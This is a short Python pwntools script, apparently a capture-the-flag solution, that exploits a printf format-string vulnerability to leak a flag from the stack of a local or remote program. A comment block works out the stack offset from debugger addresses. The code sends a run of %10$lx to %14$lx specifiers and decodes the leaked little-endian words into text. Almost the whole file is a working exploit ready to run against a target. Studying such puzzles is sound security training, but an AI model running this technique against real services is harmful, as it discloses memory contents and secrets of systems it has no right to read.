#!/usr/bin/env python3
'''
Set breakpoint at printf().
flag: 0x7fffffffe290
input: 0x7fffffffe270
saved rbp (caller's FP) address: 0x7fffffffe268
Since the first six parameters are passed through registers, and the layout of stack is: 
    |caller's FP| -> |return address| -> |parameter 1| -> |parameter 2| -> ...
(0x7fffffffe290 - 0x7fffffffe268) / 8 + 1 - 2 + 6 = 10
The flag can be regarded as the 10th parameter.
'''
from pwn import *
import sys

ans = ""
for i in range(10, 15):
    ans += f"%{i}$lx"
if len(sys.argv) < 3:
    r = process(sys.argv[1])
else:
    r = remote(sys.argv[1], int(sys.argv[2]))
r.sendline(str(ans).encode())
result = bytes.fromhex(r.recv().decode()).decode()
for i in range(0, len(result), 8):
    print(result[i:i+8][::-1], end="")
print()
r.close()
